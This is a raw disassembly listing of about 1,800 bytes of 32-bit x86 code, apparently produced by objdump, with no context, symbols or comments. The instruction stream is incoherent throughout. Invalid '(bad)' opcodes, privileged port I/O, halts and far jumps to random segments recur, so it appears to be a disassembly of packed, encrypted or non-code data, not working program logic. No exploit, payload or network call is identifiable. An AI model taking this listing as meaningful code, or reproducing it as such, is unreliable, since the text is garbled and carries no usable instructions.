  41aa98:	xchg   esp,eax
  41aa99:	(bad)  
  41aa9a:	cdq    
  41aa9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa9c:	retf   
  41aa9d:	(bad)  
  41aa9e:	test   DWORD PTR [edx+0x39],0x26a3bbfe
  41aaa5:	sub    edi,DWORD PTR [eax+0xd]
  41aaa8:	in     al,dx
  41aaa9:	xchg   ecx,eax
  41aaaa:	mov    es,WORD PTR [ebx+0x18]
  41aaad:	(bad)  
  41aaae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aaaf:	aad    0x78
  41aab1:	cs stos DWORD PTR es:[edi],eax
  41aab3:	adc    ch,bh
  41aab5:	fisubr DWORD PTR [ebx+0x1a24640c]
  41aabb:	pop    es
  41aabc:	jo     0x41ab1d
  41aabe:	adc    esi,ecx
  41aac0:	stos   BYTE PTR es:[edi],al
  41aac1:	or     al,bl
  41aac3:	add    ecx,DWORD PTR [eax-0x5d]
  41aac6:	dec    ebp
  41aac7:	add    BYTE PTR [eax+0x5b],ch
  41aaca:	sub    dh,0xf0
  41aacd:	or     BYTE PTR [eax],0xfe
  41aad0:	and    al,0x82
  41aad2:	mov    al,ds:0x7f0e21af
  41aad7:	(bad)  
  41aad8:	mov    ds,WORD PTR [ebx-0x79]
  41aadb:	repnz aam 0xf2
  41aade:	js     0x41ab53
  41aae0:	pop    esp
  41aae1:	dec    edi
  41aae2:	jge    0x41ab24
  41aae4:	inc    eax
  41aae5:	arpl   bp,bx
  41aae7:	rcr    DWORD PTR [esp+edx*1+0x36243e96],cl
  41aaee:	cwde   
  41aaef:	js     0x41ab4a
  41aaf1:	shl    BYTE PTR ds:0xf3607a89,cl
  41aaf7:	push   ds
  41aaf8:	sub    BYTE PTR [edx+ebx*1+0x54f80354],al
  41aaff:	adc    DWORD PTR [edx-0x5d],ecx
  41ab02:	dec    eax
  41ab03:	pop    edx
  41ab04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab05:	sbb    cl,BYTE PTR [eax+0x7b]
  41ab08:	in     al,dx
  41ab09:	rcl    DWORD PTR [eax+eax*8-0x5f1c38d7],cl
  41ab10:	out    0xf7,al
  41ab12:	inc    esi
  41ab13:	sub    eax,0x87b0cf12
  41ab18:	push   edx
  41ab19:	jno    0x41aa9e
  41ab1b:	cld    
  41ab1c:	jae    0x41ab19
  41ab1e:	js     0x41aaa8
  41ab20:	mov    dl,0x75
  41ab22:	aad    0x43
  41ab24:	xor    edi,esi
  41ab26:	sub    DWORD PTR [edx+0x32],0x65
  41ab2a:	or     al,0x83
  41ab2c:	scas   eax,DWORD PTR es:[edi]
  41ab2d:	dec    esp
  41ab2e:	inc    ebx
  41ab2f:	out    dx,eax
  41ab30:	sub    dl,BYTE PTR [eax]
  41ab32:	add    bl,ah
  41ab34:	jnp    0x41abae
  41ab36:	or     al,0xa1
  41ab38:	addr16 jmp 0xeab03496
  41ab3e:	addr16 int 0x94
  41ab41:	lods   al,BYTE PTR ds:[esi]
  41ab42:	out    0xd,eax
  41ab44:	inc    bp
  41ab46:	xor    eax,0xe34899a5
  41ab4b:	mov    edx,0xb6c7cf51
  41ab50:	lods   eax,DWORD PTR ds:[esi]
  41ab51:	loop   0x41ab00
  41ab53:	mov    bl,0x9e
  41ab55:	sub    BYTE PTR [ebx+0x12],bh
  41ab58:	push   ds
  41ab59:	inc    eax
  41ab5a:	test   cl,cl
  41ab5c:	fisub  DWORD PTR [edx*2+0x67d9a571]
  41ab63:	xchg   ebp,eax
  41ab64:	les    esi,FWORD PTR [edx-0x4c5c9df2]
  41ab6a:	inc    esi
  41ab6b:	jbe    0x41ab57
  41ab6d:	add    dh,BYTE PTR [ebx+edx*4]
  41ab70:	mov    ds:0x31ae0535,al
  41ab75:	jo     0x41abcb
  41ab77:	push   ebx
  41ab78:	js     0x41ab86
  41ab7a:	jmp    0xc815:0x8fafd106
  41ab81:	ficom  DWORD PTR cs:[ecx]
  41ab84:	mov    ecx,0xecdefec3
  41ab89:	or     ecx,DWORD PTR [edi-0x49]
  41ab8c:	inc    esp
  41ab8d:	maxps  xmm5,XMMWORD PTR [eax+0xee02094]
  41ab94:	in     eax,dx
  41ab95:	imul   DWORD PTR [edx-0x34]
  41ab98:	aaa    
  41ab99:	pop    esp
  41ab9a:	jecxz  0x41abc1
  41ab9c:	xlat   BYTE PTR ds:[ebx]
  41ab9d:	test   edx,0x76aff0ce
  41aba3:	(bad)  
  41aba4:	jecxz  0x41ab32
  41aba6:	call   0x45ff95e9
  41abab:	sbb    al,0xcf
  41abad:	sub    eax,DWORD PTR [ebx-0xb92197f]
  41abb3:	test   al,0x74
  41abb5:	mov    ds:0xcef7fe6a,eax
  41abba:	sbb    al,0x7f
  41abbc:	add    esi,ebx
  41abbe:	mov    ds:0x110e5c77,eax
  41abc3:	ds lock pop esp
  41abc6:	imul   esp,DWORD PTR [esi-0x61518e30],0xefdc49aa
  41abd0:	out    dx,al
  41abd1:	and    al,BYTE PTR [ebx+edi*2]
  41abd4:	jge    0x41abde
  41abd6:	out    0x19,al
  41abd8:	fsubr  DWORD PTR [eax]
  41abda:	lods   eax,DWORD PTR ds:[esi]
  41abdb:	mov    ah,0x48
  41abdd:	xor    edx,DWORD PTR [edi]
  41abdf:	movzx  esp,BYTE PTR [eax+0x2d]
  41abe3:	(bad)  
  41abe4:	fmul   QWORD PTR [edi-0x77]
  41abe7:	or     BYTE PTR [eax-0xe],bh
  41abea:	ret    
  41abeb:	mov    ebp,0x5ecfa623
  41abf0:	dec    edi
  41abf1:	push   0x3762e025
  41abf6:	inc    ebx
  41abf7:	sbb    ebp,edx
  41abf9:	xchg   BYTE PTR ds:[ecx],ch
  41abfc:	cdq    
  41abfd:	add    esi,ecx
  41abff:	(bad)  
  41ac03:	mov    WORD PTR [esi],es
  41ac05:	out    0xd9,al
  41ac07:	jno    0x41ac06
  41ac09:	lods   eax,DWORD PTR ds:[esi]
  41ac0a:	jecxz  0x41ac88
  41ac0c:	and    DWORD PTR [ecx+0x73],eax
  41ac0f:	inc    edi
  41ac10:	lahf   
  41ac11:	(bad)  
  41ac12:	lock or BYTE PTR [ecx],al
  41ac15:	mov    WORD PTR [edi-0x67],ds
  41ac18:	sbb    DWORD PTR [esi-0x4a],eax
  41ac1b:	sbb    eax,0x1f13eefc
  41ac20:	adc    BYTE PTR [eax-0x7b],dl
  41ac23:	fisubr DWORD PTR [eax+0x5c]
  41ac26:	push   0x15f31b9
  41ac2b:	jge    0x41ac22
  41ac2d:	mov    esi,0xc72a1f
  41ac32:	xlat   BYTE PTR ds:[ebx]
  41ac33:	sub    esp,DWORD PTR [esi]
  41ac35:	xchg   esp,edx
  41ac37:	pusha  
  41ac38:	mov    bl,BYTE PTR [ebx+edx*8]
  41ac3b:	or     eax,0x4be58e04
  41ac40:	push   esi
  41ac41:	add    edi,ebx
  41ac43:	popf   
  41ac44:	pushf  
  41ac45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac46:	or     esp,esi
  41ac48:	addr16 retf 0x9e9e
  41ac4c:	and    BYTE PTR [edx],0xd
  41ac4f:	fcmovnb st,st(2)
  41ac51:	popf   
  41ac52:	cmp    esi,DWORD PTR [edi+edi*2+0x14]
  41ac56:	xchg   ecx,eax
  41ac57:	rcl    BYTE PTR [eax+0x12b3fb1b],cl
  41ac5d:	fld    TBYTE PTR [eax+0x791d7e4]
  41ac63:	xor    ecx,ebx
  41ac65:	or     eax,0xae2a8c1a
  41ac6a:	es popa 
  41ac6c:	fisubr WORD PTR [ebp-0x13]
  41ac6f:	lea    ebx,[edi*4+0x503877c8]
  41ac76:	test   eax,0x329a5a2f
  41ac7b:	jno    0x41ac64
  41ac7d:	mov    ds:0xd7eb3c3a,eax
  41ac82:	xor    dl,BYTE PTR ds:0xb95a3352
  41ac88:	adc    BYTE PTR [eax+0x27],dl
  41ac8b:	sar    DWORD PTR [ebx-0x6fbf0ecd],0x50
  41ac92:	sti    
  41ac93:	jo     0x41acc4
  41ac95:	fs shl dh,0x7c
  41ac99:	(bad)  
  41ac9a:	pop    ss
  41ac9b:	adc    BYTE PTR [edi+0x3c],cl
  41ac9e:	push   ss
  41ac9f:	xchg   ch,cl
  41aca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aca2:	sti    
  41aca3:	in     al,dx
  41aca4:	aaa    
  41aca5:	jge    0x41ac5b
  41aca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aca8:	imul   esp,DWORD PTR [esp+esi*8-0x21],0xffffffd1
  41acad:	add    eax,0x209b7ee8
  41acb2:	inc    ecx
  41acb3:	xchg   esi,eax
  41acb4:	jmp    0x2043:0xcc4ad259
  41acbb:	sub    al,BYTE PTR [edx-0x5d]
  41acbe:	cmp    eax,DWORD PTR [eax+eiz*2+0x26479a8e]
  41acc5:	jno    0x41acff
  41acc7:	outs   dx,DWORD PTR ds:[esi]
  41acc8:	in     al,0xbe
  41acca:	das    
  41accb:	(bad)  
  41accc:	fnsave [esi]
  41acce:	ret    
  41accf:	sbb    al,cl
  41acd1:	aad    0x43
  41acd3:	push   ebp
  41acd4:	sbb    BYTE PTR [esi],dh
  41acd6:	sti    
  41acd7:	dec    eax
  41acd8:	not    BYTE PTR gs:[ebx-0x7ce53ba5]
  41acdf:	add    DWORD PTR [edi-0x6bc52e3a],esp
  41ace5:	jmp    0xca936d2f
  41acea:	(bad)  
  41aceb:	push   ebp
  41acec:	scas   al,BYTE PTR es:[edi]
  41aced:	test   DWORD PTR [esi],edx
  41acef:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acf1:	mov    dl,0x1
  41acf3:	outs   dx,DWORD PTR ds:[esi]
  41acf4:	jmp    0x41ac86
  41acf6:	pushf  
  41acf7:	mov    BYTE PTR [ecx+0x1f46809c],0x9f
  41acfe:	push   esp
  41acff:	sbb    al,0x75
  41ad01:	push   0x471ba761
  41ad06:	mov    ds:0x80f7c6ed,al
  41ad0b:	sti    
  41ad0c:	mov    BYTE PTR [edi+esi*4-0x48],ch
  41ad10:	stc    
  41ad11:	jbe    0x41ad69
  41ad13:	std    
  41ad14:	into   
  41ad15:	sbb    al,0x74
  41ad17:	cli    
  41ad18:	clc    
  41ad19:	shl    DWORD PTR [ecx+0x5117db8e],1
  41ad1f:	mov    edi,0x21c351b7
  41ad24:	hlt    
  41ad25:	fild   WORD PTR [edi+ecx*1]
  41ad28:	jae    0x41ad8a
  41ad2a:	pusha  
  41ad2b:	call   DWORD PTR [eax]
  41ad2d:	inc    ecx
  41ad2e:	repnz push ss
  41ad30:	in     al,0x9b
  41ad32:	dec    ebx
  41ad33:	jbe    0x41ad62
  41ad35:	fs sti 
  41ad37:	test   bh,bl
  41ad39:	ret    
  41ad3a:	int    0xb8
  41ad3c:	mov    esp,0xc6063525
  41ad41:	ins    BYTE PTR es:[edi],dx
  41ad42:	mov    ecx,ebp
  41ad44:	retf   0xb2c9
  41ad47:	out    0x9a,eax
  41ad49:	cdq    
  41ad4a:	xchg   ebp,eax
  41ad4b:	rol    BYTE PTR es:[ebx],1
  41ad4e:	ficom  WORD PTR [eax]
  41ad50:	popf   
  41ad51:	fist   WORD PTR gs:[ebx+0x77]
  41ad55:	pop    ecx
  41ad56:	(bad)  
  41ad57:	push   ebp
  41ad58:	es cli 
  41ad5a:	push   ecx
  41ad5b:	loopne 0x41ad7e
  41ad5d:	mov    dl,0x52
  41ad5f:	pop    edx
  41ad60:	aam    0x5e
  41ad62:	test   eax,0xd210e92d
  41ad67:	data16 jno 0x41adad
  41ad6a:	call   0xf2760934
  41ad6f:	addr16 cmp eax,0x861a7051
  41ad75:	inc    ebx
  41ad76:	push   esi
  41ad77:	aas    
  41ad78:	aad    0x77
  41ad7a:	mov    ch,bl
  41ad7c:	xchg   edi,eax
  41ad7d:	jge    0x41adb9
  41ad7f:	call   0xfb2d:0x8adf033d
  41ad86:	ret    0x99bd
  41ad89:	xor    DWORD PTR [ecx+0x653d2206],ecx
  41ad8f:	mov    bh,0x9f
  41ad91:	pusha  
  41ad92:	mov    al,0x18
  41ad94:	dec    eax
  41ad95:	aam    0x90
  41ad97:	cmp    ebp,DWORD PTR [eax]
  41ad99:	or     ebp,ecx
  41ad9b:	imul   DWORD PTR [edi+0x15e3273]
  41ada1:	(bad)
  41ada4:	mov    BYTE PTR [edi],bh
  41ada6:	mov    ebp,0x7b95d490
  41adab:	scas   al,BYTE PTR es:[edi]
  41adac:	ret    
  41adad:	test   BYTE PTR [edx+0x2e412fd1],ch
  41adb3:	inc    ecx
  41adb4:	sbb    eax,0xbb73314b
  41adb9:	out    0xe4,al
  41adbb:	dec    esi
  41adbc:	scas   eax,DWORD PTR es:[edi]
  41adbd:	cmp    BYTE PTR [edx+0x45],cl
  41adc0:	popa   
  41adc1:	inc    esi
  41adc2:	js     0x41ae0b
  41adc4:	jmp    0x41ae35
  41adc6:	rcl    BYTE PTR [ebp+0x58],0x72
  41adca:	cs jno 0x41ade9
  41adcd:	jp     0x41add2
  41adcf:	or     DWORD PTR [edx-0x62],ebx
  41add2:	or     BYTE PTR [eax-0x15],bh
  41add5:	mov    esp,0x580bb17d
  41adda:	mov    ebx,0x1b769478
  41addf:	add    bh,dh
  41ade1:	push   0xfc821a1b
  41ade6:	out    dx,al
  41ade7:	mov    al,ds:0x511eb8f
  41adec:	cmp    DWORD PTR [ebp-0x102aff03],edi
  41adf2:	inc    ecx
  41adf3:	aam    0xd8
  41adf5:	inc    esi
  41adf6:	pop    ecx
  41adf7:	mov    al,0xe
  41adf9:	mov    ecx,0xa898fae9
  41adfe:	jg     0x41ad94
  41ae00:	rcr    DWORD PTR [ecx],0xfd
  41ae03:	cmp    cl,bh
  41ae05:	push   0x49
  41ae07:	dec    ebx
  41ae08:	dec    edx
  41ae09:	(bad)  
  41ae0a:	enter  0x7d1e,0x18
  41ae0e:	dec    edi
  41ae0f:	jae    0x41adbb
  41ae11:	inc    edx
  41ae12:	jae    0x41ae57
  41ae14:	mov    edi,0x1e885bb9
  41ae19:	xchg   ecx,eax
  41ae1a:	dec    eax
  41ae1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae1c:	sbb    dl,cl
  41ae1e:	adc    BYTE PTR [ecx+0x4fc88546],dh
  41ae24:	pop    ds
  41ae25:	sub    eax,0x68ff2e89
  41ae2a:	add    al,0x75
  41ae2c:	mov    ds:0x8d140811,al
  41ae31:	jno    0x41ae7d
  41ae33:	pop    ecx
  41ae34:	test   DWORD PTR [eax-0x7],ebx
  41ae37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae38:	mov    edx,0xe8ac8291
  41ae3d:	ins    BYTE PTR es:[edi],dx
  41ae3e:	push   ds
  41ae3f:	or     dl,BYTE PTR [ecx-0x1a99fe43]
  41ae45:	(bad)  
  41ae46:	fldcw  WORD PTR [edx-0x3d]
  41ae49:	mov    esi,0x3bd4c458
  41ae4e:	imul   ebp
  41ae50:	test   eax,0x80d5a91a
  41ae55:	scas   eax,DWORD PTR es:[edi]
  41ae56:	leave  
  41ae57:	lds    eax,FWORD PTR [ebx]
  41ae59:	int3   
  41ae5a:	jge    0x41ae67
  41ae5c:	dec    DWORD PTR [ebx+0x3b]
  41ae5f:	ins    DWORD PTR es:[edi],dx
  41ae60:	adc    al,0x33
  41ae62:	retf   
  41ae63:	or     ebx,DWORD PTR [ecx]
  41ae65:	lods   eax,DWORD PTR ds:[esi]
  41ae66:	mov    dh,0x9e
  41ae68:	mov    al,ds:0xc191b3f5
  41ae6d:	leave  
  41ae6e:	dec    DWORD PTR [esi+0x69]
  41ae71:	xchg   ebx,eax
  41ae72:	jge    0x41ae8e
  41ae74:	into   
  41ae75:	lods   eax,DWORD PTR ds:[esi]
  41ae76:	call   0xe3f2:0xc2130908
  41ae7d:	jg     0x41ae88
  41ae7f:	je     0x41ae1a
  41ae81:	inc    eax
  41ae82:	pop    esp
  41ae83:	jecxz  0x41ae82
  41ae85:	jns    0x41af00
  41ae87:	mov    ah,0x4a
  41ae89:	out    0xfa,al
  41ae8b:	add    al,0x9b
  41ae8d:	test   DWORD PTR [ebp+0x3d845cbe],esp
  41ae93:	xchg   DWORD PTR [ebp-0x39],ebx
  41ae96:	outs   dx,BYTE PTR ds:[esi]
  41ae97:	sti    
  41ae98:	xor    al,0xb1
  41ae9a:	xchg   esi,eax
  41ae9b:	sub    cl,BYTE PTR [ebx]
  41ae9d:	mov    dh,0x98
  41ae9f:	outs   dx,DWORD PTR ds:[esi]
  41aea0:	aam    0xfb
  41aea2:	js     0x41af07
  41aea4:	mov    dl,0x8d
  41aea6:	stos   BYTE PTR es:[edi],al
  41aea7:	rcl    bl,0x12
  41aeaa:	push   0x2e9df201
  41aeaf:	push   ds
  41aeb0:	sub    ebx,DWORD PTR [ebx+0x44b2dd42]
  41aeb6:	xor    edi,0x5936d489
  41aebc:	sbb    eax,0x195f9427
  41aec1:	test   DWORD PTR [edx],edi
  41aec3:	cmp    DWORD PTR [ecx-0x4d],ecx
  41aec6:	in     eax,0xdf
  41aec8:	push   es
  41aec9:	lea    ecx,[ebp-0x872eb8a]
  41aecf:	pop    ecx
  41aed0:	mov    ds:0x3090e5e8,eax
  41aed5:	fimul  DWORD PTR [esi+0x6c]
  41aed8:	sub    BYTE PTR [eax],0xa9
  41aedb:	or     BYTE PTR [ecx+0x40593208],ch
  41aee1:	add    ch,ch
  41aee3:	jle    0x41aeaf
  41aee5:	sub    DWORD PTR [esi+ebx*4],ebx
  41aee8:	sub    ch,0xc5
  41aeeb:	in     eax,0x11
  41aeed:	sub    dh,BYTE PTR [esi+0x869460c]
  41aef3:	push   esp
  41aef4:	push   cs
  41aef5:	shl    esp,1
  41aef7:	add    eax,0xc5e28845
  41aefc:	jmp    0xf5af:0xfdc4eb72
  41af03:	sub    al,0xc1
  41af05:	push   0x29fc48a1
  41af0a:	inc    esp
  41af0b:	mov    al,ds:0x704c561a
  41af10:	(bad)
  41af13:	xor    ch,BYTE PTR ds:0x865d6c4
  41af19:	cmc    
  41af1a:	rcl    DWORD PTR [edi],1
  41af1c:	add    BYTE PTR [edi-0x76],ah
  41af1f:	daa    
  41af20:	shr    dl,cl
  41af22:	push   ss
  41af23:	sbb    BYTE PTR [ebp-0x7e],dh
  41af26:	mov    esp,0xeb199802
  41af2b:	xor    ecx,edi
  41af2d:	jne    0x41aef4
  41af2f:	lods   al,BYTE PTR ds:[esi]
  41af30:	scas   eax,DWORD PTR es:[edi]
  41af31:	mov    edi,0xa4b6371
  41af36:	mov    bh,0xe8
  41af38:	jmp    0x176117a8
  41af3d:	push   ebp
  41af3e:	cmp    BYTE PTR [eax],bl
  41af40:	rcr    DWORD PTR [ebp+0x42379ced],cl
  41af46:	xor    al,0xd2
  41af48:	xchg   ebx,eax
  41af49:	lea    eax,[edx]
  41af4b:	xchg   ebp,eax
  41af4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af4f:	les    ebp,FWORD PTR [esi]
  41af51:	int3   
  41af52:	test   BYTE PTR [esi],cl
  41af54:	gs push ebp
  41af56:	leave  
  41af57:	jno    0x41af21
  41af59:	into   
  41af5a:	xor    esp,DWORD PTR [edi+0x5a86bdd7]
  41af60:	fdivr  QWORD PTR [edi-0xb411422]
  41af66:	ret    0x52fd
  41af69:	mov    ds:0x8327f15d,al
  41af6e:	push   eax
  41af6f:	cmp    ah,BYTE PTR [ebp+0x35]
  41af72:	imul   edi,DWORD PTR [eax+eax*1-0x5e8b92c4],0xffffffe9
  41af7a:	fstp   DWORD PTR [eax]
  41af7c:	sbb    dh,dl
  41af7e:	(bad)  
  41af7f:	xchg   esp,eax
  41af80:	leave  
  41af81:	mov    al,ds:0x99a242db
  41af86:	jmp    0xd2f:0x78c334b6
  41af8d:	popa   
  41af8e:	jb     0x41af10
  41af90:	pop    ebp
  41af91:	add    eax,0x50d069eb
  41af96:	sbb    bh,BYTE PTR [edx-0x6a]
  41af99:	jl     0x41afab
  41af9b:	and    al,0x5
  41af9d:	call   0xad5d:0x24e70da2
  41afa4:	cmp    dl,0x25
  41afa7:	hlt    
  41afa8:	in     eax,0xfd
  41afaa:	jno    0x41af37
  41afac:	rcl    BYTE PTR [ebp+0x32552689],0xe8
  41afb3:	gs in  eax,0xe6
  41afb6:	inc    esi
  41afb7:	cmp    dl,BYTE PTR [edi]
  41afb9:	ret    
  41afba:	fnstcw WORD PTR [edi+0x4b]
  41afbd:	(bad)  
  41afbe:	call   ecx
  41afc0:	fiadd  DWORD PTR [ecx-0x75]
  41afc3:	jbe    0x41b026
  41afc5:	(bad)  
  41afc6:	stc    
  41afc7:	jns    0x41b026
  41afc9:	adc    eax,0xcf1051b7
  41afce:	loope  0x41b019
  41afd0:	fwait
  41afd1:	int    0xb1
  41afd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afd4:	push   ecx
  41afd5:	jecxz  0x41b020
  41afd7:	ror    DWORD PTR ds:0xeb7ad2cd,1
  41afdd:	mov    WORD PTR [ebx-0x16d9b215],ss
  41afe3:	jg     0x41b042
  41afe5:	ds movmskps esp,xmm2
  41afe9:	sub    bh,BYTE PTR [esi-0x2a]
  41afec:	sbb    dl,dl
  41afee:	or     BYTE PTR [edi-0x73],0xff
  41aff2:	sbb    bl,BYTE PTR [edx+0x6014afee]
  41aff8:	div    DWORD PTR [edi]
  41affa:	xor    eax,0x1d21615e
  41afff:	enter  0x16b,0x87
  41b003:	(bad)  
  41b004:	mov    cl,0x1c
  41b006:	pop    esi
  41b007:	fs sub al,0x5b
  41b00a:	cmc    
  41b00b:	sub    esp,ecx
  41b00d:	call   0x74d9:0x854f876e
  41b014:	in     al,0x81
  41b016:	gs push 0x2a42b036
  41b01c:	jecxz  0x41aff1
  41b01e:	jo     0x41aff9
  41b020:	sbb    dh,BYTE PTR [edi]
  41b022:	nop
  41b023:	sub    esi,DWORD PTR [eax]
  41b025:	mov    es,WORD PTR [edi-0x20b1c204]
  41b02b:	add    BYTE PTR [ebx-0x7b],0x71
  41b02f:	cmc    
  41b030:	(bad)  
  41b031:	push   ds
  41b032:	mov    al,gs:0xc31236bc
  41b038:	cwde   
  41b039:	test   ch,0x8c
  41b03c:	xor    edx,eax
  41b03e:	imul   eax,ebx,0x2da9e58d
  41b044:	cli    
  41b045:	push   esi
  41b046:	mov    dl,0x7e
  41b048:	add    ecx,ecx
  41b04a:	arpl   WORD PTR [ecx+0x11],cx
  41b04d:	or     bl,0x3
  41b050:	sub    esi,DWORD PTR [esi+eax*4+0x47]
  41b054:	mov    edi,0x7e11a8e0
  41b059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b05a:	or     al,0xd3
  41b05c:	mov    dh,0x46
  41b05e:	(bad)  
  41b05f:	jle    0x41b097
  41b061:	popa   
  41b062:	push   ecx
  41b063:	or     BYTE PTR [ebx+0x19],ch
  41b066:	repnz sub DWORD PTR [edx+0x6bd89ef3],esp
  41b06d:	push   0x5b
  41b06f:	shl    DWORD PTR [ebx-0x1508b3ff],1
  41b075:	add    DWORD PTR [ecx+edx*4-0x5b],esi
  41b079:	xchg   ecx,eax
  41b07a:	inc    eax
  41b07b:	add    BYTE PTR [esi+0x4],ah
  41b07e:	fbstp  TBYTE PTR [edx-0x3984e6aa]
  41b084:	mov    cl,0xf
  41b086:	xchg   BYTE PTR [ebx-0x38b97e82],ch
  41b08c:	sti    
  41b08d:	inc    eax
  41b08e:	xchg   ecx,eax
  41b08f:	idiv   BYTE PTR [edi]
  41b091:	push   esi
  41b092:	dec    eax
  41b093:	lods   al,BYTE PTR ds:[esi]
  41b094:	cmp    al,0xf5
  41b096:	cmp    DWORD PTR ds:0x7bbca321,0xffffffbb
  41b09d:	xlat   BYTE PTR ds:[ebx]
  41b09e:	(bad)  
  41b09f:	mov    ebp,0xe6372c33
  41b0a4:	out    0x65,eax
  41b0a6:	adc    DWORD PTR [ebx-0x3f4cab5b],eax
  41b0ac:	loopne 0x41b045
  41b0ae:	outs   dx,BYTE PTR ds:[esi]
  41b0af:	scas   eax,DWORD PTR es:[edi]
  41b0b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0b1:	sub    al,al
  41b0b3:	(bad)  
  41b0b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0b5:	pop    ecx
  41b0b6:	inc    esp
  41b0b7:	or     ebx,DWORD PTR ss:[edi+0x5fffa008]
  41b0be:	add    dh,bl
  41b0c0:	and    al,0x80
  41b0c2:	pop    esp
  41b0c3:	sar    DWORD PTR [ebx],0xd5
  41b0c6:	ins    DWORD PTR es:[edi],dx
  41b0c7:	fcmovbe st,st(5)
  41b0c9:	fimul  DWORD PTR ds:[ebp+0x44]
  41b0cd:	mov    ah,0x5f
  41b0cf:	loopne 0x41b074
  41b0d1:	sub    dh,dh
  41b0d3:	ror    DWORD PTR [eax-0x9],cl
  41b0d6:	add    DWORD PTR [esi+0xe],ecx
  41b0d9:	test   BYTE PTR [ecx-0x36],al
  41b0dc:	cs jl  0x41b10c
  41b0df:	(bad)  
  41b0e0:	xor    edi,ebx
  41b0e2:	not    ebx
  41b0e4:	mov    bl,0xf4
  41b0e6:	fdiv   QWORD PTR [ecx-0x26]
  41b0e9:	daa    
  41b0ea:	loope  0x41b0ae
  41b0ec:	stos   DWORD PTR es:[edi],eax
  41b0ed:	mov    al,0x4f
  41b0ef:	(bad)  [edi-0x19cb9309]
  41b0f5:	div    BYTE PTR [ebx-0x8]
  41b0f8:	add    DWORD PTR [esi-0x315a8498],0x7275cb55
  41b102:	loop   0x41b145
  41b104:	add    eax,0x16c01768
  41b109:	jmp    0x41b17a
  41b10b:	je     0x41b0c8
  41b10d:	jb     0x41b0ec
  41b10f:	ins    DWORD PTR es:[edi],dx
  41b110:	sub    cl,BYTE PTR [eax+0x79467812]
  41b116:	je     0x41b0be
  41b118:	mov    bl,0xaa
  41b11a:	push   ss
  41b11b:	and    BYTE PTR ss:[ecx],0x5a
  41b11f:	mov    esi,0x6e2f847e
  41b124:	icebp  
  41b125:	adc    BYTE PTR [edx],0x8a
  41b128:	in     eax,dx
  41b129:	mov    ds:0x56e88978,al
  41b12e:	inc    ebx
  41b12f:	ret    0x4b49
  41b132:	test   BYTE PTR [edx+0x11],al
  41b135:	pop    ecx
  41b136:	pop    esp
  41b137:	or     DWORD PTR [ebp+0x25],0xd56d78f2
  41b13e:	jl     0x41b1a4
  41b140:	xlat   BYTE PTR ds:[ebx]
  41b142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b143:	nop
  41b144:	cmp    eax,0x1023c881
  41b149:	into   
  41b14a:	ja     0x41b123
  41b14c:	idiv   BYTE PTR [ecx]
  41b14e:	add    al,cl
  41b150:	sbb    DWORD PTR [ebx+ecx*4+0x7d],0xffffff94
  41b155:	es push esp
  41b157:	jecxz  0x41b10e
  41b159:	pop    esi
  41b15a:	ja     0x41b13f
  41b15c:	and    BYTE PTR [esi+ebx*2+0x1d],dh
  41b160:	fcom   DWORD PTR [ebp+0x68]
  41b163:	ret    
  41b164:	loop   0x41b1a6
  41b166:	bound  ebp,QWORD PTR [eax]
  41b168:	ret    
  41b169:	arpl   WORD PTR [eax+0x27],di
  41b16c:	cmp    al,BYTE PTR [ebp+0x3e]
  41b16f:	daa    
  41b170:	push   eax
  41b171:	or     DWORD PTR [edi+0x67757aed],edx
  41b177:	fwait
  41b178:	pop    ss
  41b179:	or     DWORD PTR ds:0x1f1c824,edi
  41b17f:	push   cs
  41b180:	push   0x62313495
  41b185:	push   ebx
  41b186:	ret    
  41b187:	loope  0x41b138
  41b189:	or     al,0xd9
  41b18b:	test   ebp,ebx
  41b18d:	div    BYTE PTR [ebx]
  41b18f:	int3   
  41b190:	sti    
  41b191:	mov    al,ds:0x7cee6272
  41b196:	leave  
  41b197:	test   BYTE PTR [esi-0x72],ah
  41b19a:	xor    esp,DWORD PTR [esi+0x50]
  41b19d:	cmp    dh,BYTE PTR [ebx+eax*1-0x6384e13]
  41b1a4:	out    0xb9,eax
  41b1a6:	scas   eax,DWORD PTR es:[edi]
  41b1a7:	fs aaa 
  41b1a9:	xor    DWORD PTR [ecx],eax
  41b1ab:	dec    esi
  41b1ac:	push   esi
  41b1ad:	retf   0x6f0d
  41b1b0:	xchg   edi,eax
  41b1b1:	xchg   DWORD PTR [esi-0xfdd644e],esi
  41b1b7:	xchg   esi,eax
  41b1b8:	cli    
  41b1b9:	push   eax
  41b1ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1bb:	and    BYTE PTR [eax+ecx*2],al
  41b1be:	test   al,0x51
  41b1c0:	jmp    0xcaa7c755
  41b1c5:	push   es
  41b1c6:	pop    edi
  41b1c7:	repz fxch st(4)
  41b1ca:	imul   ecx,eax,0x4dc52052
  41b1d0:	and    DWORD PTR [eax-0x63671d6a],ebp
  41b1d6:	sbb    eax,0x6dfab343
  41b1db:	cmp    bh,BYTE PTR [esi+eiz*2-0x80]
  41b1df:	xor    bl,dl
  41b1e1:	sbb    bh,ah
  41b1e3:	sub    dl,BYTE PTR [edx]
  41b1e5:	mov    ds:0xbe4d2c86,eax
  41b1ea:	push   0xfffffffa
  41b1ec:	mov    BYTE PTR [edi-0x26d36091],ch
  41b1f2:	loope  0x41b1f8
  41b1f4:	sbb    DWORD PTR [ecx+0x35b56ad5],edx
  41b1fa:	inc    edx
  41b1fb:	scas   eax,DWORD PTR es:[edi]
  41b1fc:	jle    0x41b19f
